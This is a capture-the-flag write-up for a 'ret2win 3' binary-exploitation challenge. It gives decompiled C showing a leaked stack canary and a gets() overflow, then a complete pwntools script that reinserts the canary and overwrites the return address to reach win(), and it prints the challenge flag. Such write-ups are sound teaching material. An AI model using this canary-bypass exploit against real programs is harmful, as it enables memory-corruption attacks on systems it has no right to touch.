# [Pwn] ret2win 3

## 📚 Overview

> *"Salah satu mitigasi dari buffer overflow di stack adalah canary. Canary adalah 8 byte random yang diletakkan sebelum saved RBP. Jadi, kalau kita overwrite saved RIP menggunakan buffer overflow, canary pasti akan ikut berubah. Canary akan diperiksa oleh program setiap sebelum keluar fungsi dan kalau canary-nya berubah dari sebelumnya, berarti telah terjadi buffer overflow dan program akan dihentikan. Tapi, kalau kita tau canary-nya, kita tinggal masukin ke payload kita di offset yang sesuai."*

## 💻 Decompiled Code

The binary given has enabled the feature of **stack canary** to mitigate buffer overflow attack. However, the canary's value was *leak* so we will use the value in our payload before overwriting the RIP.

```c
void win(void)
{
  FILE *file;
  long in_FS_OFFSET;
  char flag [104];
  long canary_value;
  
  canary_value = *(long *)(in_FS_OFFSET + 0x28);
  file = fopen("flag.txt","r");
  if (file == (FILE *)0x0) {
    puts("flag.txt not found");
    FUN_00401140(0xffffffff);
  }
  fgets(flag,100,file);
  fclose(file);
  printf("Wow, how did you get here? Here\'s the flag:\n%s\n",flag);
  if (canary_value != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}

undefined8 main(void)
{
  long in_FS_OFFSET;
  char buffer [104];
  long canary_value;
  
  canary_value = *(long *)(in_FS_OFFSET + 0x28);
  printf("Here\'s a gift for you: 0x%lx\n",canary_value);
  printf("Give me your payload: ");
  gets(buffer);
  if (canary_value != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

## ⚙ Full Script

**Payload >** Overflow the buffer to reach the stack but save some spaces for canary, insert the leaked canary value + padding bytes, and then overwrite the RIP with `win()` address.

```python
from pwn import *
elf = context.binary = ELF("./ret2win", checksec=False)

p = process('./ret2win')
# p = remote("IP_ADDR", PORT)

RET_ADDR = p64(0x40101a)
WIN_ADDR = p64(elf.symbols.win)
p.recvuntil(b'Here\'s a gift for you: ')
CANARY = int(p.recv(18), 16)

payload = b'A' * 0x68 + p64(CANARY)
payload += b'B' * 8 + RET_ADDR + WIN_ADDR
p.sendlineafter(b"Give me your payload: ", payload)

response = p.recvall(timeout=1).strip()
print(response.decode())

# TCP1P{gimana_rasanya_ngebypass_mitigasi_pertama_bang}

p.close()
```